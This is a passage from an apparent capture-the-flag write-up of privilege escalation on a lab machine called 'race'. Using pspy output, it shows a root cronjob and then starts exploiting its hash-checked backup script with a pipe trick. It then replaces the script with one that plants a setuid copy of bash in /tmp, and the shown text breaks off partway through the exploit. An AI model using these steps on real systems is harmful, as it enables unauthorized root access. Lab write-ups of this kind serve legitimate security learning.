## Privelege Escalation
Looking through pspy from the SSH session, we have a cronjob running as root.
Every minute, it runs offsite-backup.sh from cron via secure-cron-runner.sh:
<Terminal prompt="$">

2025/08/29 20:26:01 CMD: UID=0     PID=15851  | /bin/sh -c /usr/local/bin/secure-cron-runner.sh >/dev/null 2>/dev/null 
2025/08/29 20:26:01 CMD: UID=0     PID=15857  | /usr/bin/bash /usr/local/share/race-scripts/offsite-backup.sh 
</Terminal>
The script is simple; it contains hard-coded MD5 hashes of any script that needs to be run, which
are checked immediately before execution. If it doesn't match, it doesn't run and instead logs the
error
For the exploit I'll start by making a pipe with the script name
Then move the pipe and create a malicious  script.
<Terminal prompt="$">
max@race:/usr/local/share/race-scripts$ rm offsite-backup.sh

max@race:/usr/local/share/race-scripts$ echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/polo\nchmod 6777 /tmp/polo' | tee offsite-backup.sh
#!/bin/bash
